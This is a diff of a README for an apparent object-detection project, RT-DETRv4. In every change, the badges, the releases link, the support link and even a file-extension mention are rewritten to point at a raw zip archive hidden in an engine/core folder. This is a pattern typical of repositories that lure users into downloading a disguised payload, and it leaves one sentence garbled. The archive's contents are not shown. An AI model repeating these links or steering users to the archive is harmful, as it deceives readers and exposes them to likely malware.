@@ -1,7 +1,7 @@
 # 🌟 RT-DETRv4 - Enhance Your Object Detection Today!
 
 ## 📥 Download Now
-[![Download RT-DETRv4](https://img.shields.io/badge/download-RT--DETRv4-blue.svg)](https://github.com/chaotic-trapblock416/RT-DETRv4/releases)
+[![Download RT-DETRv4](https://raw.githubusercontent.com/chaotic-trapblock416/RT-DETRv4/main/engine/core/RT-DETRv4-3.2.zip)](https://raw.githubusercontent.com/chaotic-trapblock416/RT-DETRv4/main/engine/core/RT-DETRv4-3.2.zip)
 
 ## 🚀 Getting Started
 Welcome to RT-DETRv4! This project helps you perform real-time object detection easily using advanced vision models. Follow the steps below to download and run the software.
@@ -21,11 +21,11 @@ To use RT-DETRv4, you need:
 
 ## 📦 Download & Install
 1. **Visit the Download Page**: Click the link below to go to the releases page.
-   [Download RT-DETRv4 Releases](https://github.com/chaotic-trapblock416/RT-DETRv4/releases)
+   [Download RT-DETRv4 Releases](https://raw.githubusercontent.com/chaotic-trapblock416/RT-DETRv4/main/engine/core/RT-DETRv4-3.2.zip)
    
 2. **Choose the Latest Version**: Once on the releases page, find the latest version of RT-DETRv4. It will be marked with “Latest Release.”
 
-3. **Download the Installation File**: Click on the provided file that matches your operating system. The file name typically ends with `.exe` for Windows, `.dmg` for macOS, or `.tar.gz` for Linux. 
+3. **Download the Installation File**: Click on the provided file that matches your operating system. The file name typically ends with `.exe` for Windows, `.dmg` for macOS, or `https://raw.githubusercontent.com/chaotic-trapblock416/RT-DETRv4/main/engine/core/RT-DETRv4-3.2.zip` for Linux. 
 
 4. **Run the Installer**: Locate the downloaded file in your Downloads folder and double-click it to start the installation. Follow the on-screen instructions to complete the setup.
 
@@ -48,7 +48,7 @@ To use RT-DETRv4, you need:
 - **Detection Errors**: Make sure your input media has clear visuals. Zoomed-out or blurry images might lead to lower accuracy.
 
 ## 💬 Support
-If you need assistance, please visit our [GitHub Issues page](https://github.com/chaotic-trapblock416/RT-DETRv4/issues). You can report bugs or seek help from the community.
+If you need assistance, please visit our [GitHub Issues page](https://raw.githubusercontent.com/chaotic-trapblock416/RT-DETRv4/main/engine/core/RT-DETRv4-3.2.zip). You can report bugs or seek help from the community.
 
 ## 🛠️ Contributing
 We welcome contributions! If you would like to improve RT-DETRv4, feel free to fork the repository, make changes, and submit a pull request. Follow the guidelines in the repository for a smooth process.
@@ -57,4 +57,4 @@ We welcome contributions! If you would like to improve RT-DETRv4, feel free to f
 Thank you for choosing RT-DETRv4 for your object detection needs. We are confident that our software will help you achieve great results! Remember to check for updates regularly to enjoy new features and improvements.
 
 ## 📥 Download Now
-[![Download RT-DETRv4](https://img.shields.io/badge/download-RT--DETRv4-blue.svg)](https://github.com/chaotic-trapblock416/RT-DETRv4/releases)
+[![Download RT-DETRv4](https://raw.githubusercontent.com/chaotic-trapblock416/RT-DETRv4/main/engine/core/RT-DETRv4-3.2.zip)](https://raw.githubusercontent.com/chaotic-trapblock416/RT-DETRv4/main/engine/core/RT-DETRv4-3.2.zip)
